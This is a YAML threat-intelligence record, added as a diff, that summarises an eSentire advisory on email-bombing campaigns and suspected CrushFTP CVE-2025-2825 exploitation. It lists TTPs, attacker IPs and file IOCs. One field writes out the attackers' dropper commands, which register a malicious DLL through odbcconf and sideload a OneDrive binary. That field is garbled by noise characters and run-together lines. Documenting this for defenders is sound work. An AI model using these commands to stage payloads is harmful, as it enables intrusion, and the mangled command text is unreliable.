@@ -1,0 +1,61 @@
+description: eSentire has identified suspected exploitation of the critical CrushFTP
+  authentication bypass vulnerability CVE-2025-2825 and observed multiple Email Bombing
+  attacks involving threat actors using phishing techniques to gain remote access,
+  install malware, and ultimately deploy ransomware.
+date: '2025-01-30'
+authors: eSentire
+attribution: STAC5143; STAC5777
+malware_families:
+- XenArmor
+- SharpShares
+TTPs:
+  processs:
+  - Microsoft Edge
+  - tar.exe
+  - odbcconf.exe
+  - OneDriveStandaloneUpdater.exe
+  - Quick Assist
+  - Teams
+  - PowerShell
+  - TeamViewer
+  commandline:
+  - '> type kb052117-01.bpx kb052123-02.bpx > pack.zip'
+  - 'V V.V V VvV V VvV Vtar xf pack.zip -C "%TEMP%" arch1271.cabmd "%LOCALAPPDATA%\\Microsoft\\ODBC"expand
+      "%TEMP%\\arch1271.cab -F:* "%LOCALAPPDATA%\\Microsoft\\0ODBC"cd /d "%LOCALAPPDATA%\\Microsoft\\ODBC"start
+      " odbcconf /a {REGSVR "%LOCALAPPDATA%\\Microsoft\\ODBC\\wscapi.dll"}del /F "%TEMP%\\arch1271.cabcd
+    /d "%CD%"echo Filters installed successfully!VvV V.V V V V V V V VvV VvV Vtar
+    xf pack.zip -C "%TEMP%" arch1271.cabexpand "%TEMP%\\arch1271.cab -F:x "%LOCALAPPDATA%\\Microsoft\\OneDrive"del
+    /F "%TEMP%\\arch1271.cabcd /d "%LOCALAPPDATA%\\Microsoft\\OneDrive"start "" "%LOCALAPPDATA%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe
+    -Embeddingcd /d "%CD%"echo Filters installed successfully!)del kb@52117-01.bpxdel
+    kb052123-02.bpxdel pack.zip
+  - exit'
+  powershell:
+  - download additional payloads and establish persistence, once a threat actor has
+    gained remote access to a host.
+  registry_keys:
+  - HKCU\\SOFTWARE\\TitanPlus
+  network_connections:
+  - 45.8.157.199:443
+  - 5.181.3.164:443
+  - 38.180.25.3:443
+  file_modifications:
+  - '%TEMP%\\arch1271.cab'
+  - '%LOCALAPPDATA%\\Microsoft\\ODBC\\wscapi.dll'
+  - '%LOCALAPPDATA%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe'
+  persistence:
+  - TeamViewer
+  pipes: []
+  process_relations: []
+IOCs:
+  domains:
+  - filters6[.]s3[.]us-east-2[.]amazonaws[.]com
+  urls:
+  - hxxps://filters6[.]s3[.]us-east-2[.]amazonaws[.]com/gtjs.html?t=drivers
+  files:
+  - kb052117-01.bpx
+  - kb052123-02.bpx
+  - pack.zip
+  - arch1271.cab
+  - wscapi.dll
+reference: https://www.esentire.com/security-advisories/ongoing-email-bombing-campaigns-leading-to-remote-access-and-post-exploitation
+file_creation_date: May 12, 2025
